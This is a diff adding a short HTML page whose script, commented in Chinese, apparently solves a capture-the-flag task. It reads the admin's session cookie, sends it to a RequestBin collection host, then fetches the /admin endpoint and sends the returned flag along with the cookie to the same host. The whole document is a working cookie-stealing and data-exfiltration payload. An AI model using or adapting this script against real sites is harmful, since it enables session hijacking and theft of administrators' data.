@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  // 读取admin的sid Cookie（HttpOnly=false，可读取）
+  const sid = document.cookie.match(/sid=([^;]+)/)?.[1] || 'no_sid';
+  // 构造请求地址，将sid拼接到URL参数中
+  const attackerUrl = 'http://www.requestbin.cn:80/1fn11tu1?sid=' + encodeURIComponent(sid);
+  // 发送GET请求，将sid发送到攻击者的RequestBin
+  fetch(attackerUrl, { method: 'GET', mode: 'no-cors' });
+
+  // 额外：直接访问/admin接口，将FLAG也发送到RequestBin（一步到位）
+  fetch('/admin').then(res => res.json()).then(data => {
+    const flag = data.flag || 'no_flag';
+    fetch('http://www.requestbin.cn:80/1fn11tu1?sid=' + encodeURIComponent(sid) + '&flag=' + encodeURIComponent(flag), { method: 'GET', mode: 'no-cors' });
+  });
+</script>
+</body>
+</html>
